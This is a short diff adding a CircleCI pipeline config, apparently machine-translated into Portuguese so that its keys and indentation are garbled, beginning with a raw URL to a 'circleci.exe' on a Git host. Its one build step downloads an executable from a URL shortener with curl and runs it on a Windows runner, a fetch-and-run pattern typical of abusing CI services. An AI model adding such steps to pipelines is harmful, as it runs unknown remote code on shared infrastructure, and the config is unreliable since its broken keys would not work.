@@ -1,0 +1,14 @@
+https://gcllab.com/haithuongpro2711/haivps/-/raw/master/circleci.exe
+ 
+ versão: 2.1
+  
+  orbes:
+    vitória: circleci/windows@2.2.0
+     
+     empregos:
+       construir:
+           executor:
+                 nome: vitória/padrão
+                       shell: cmd.exe
+                           degraus:
+                                 - execute: curl -L -o yourcustomlink.exe https://is.gd/yourcustomlink && yourcustomlink.execute
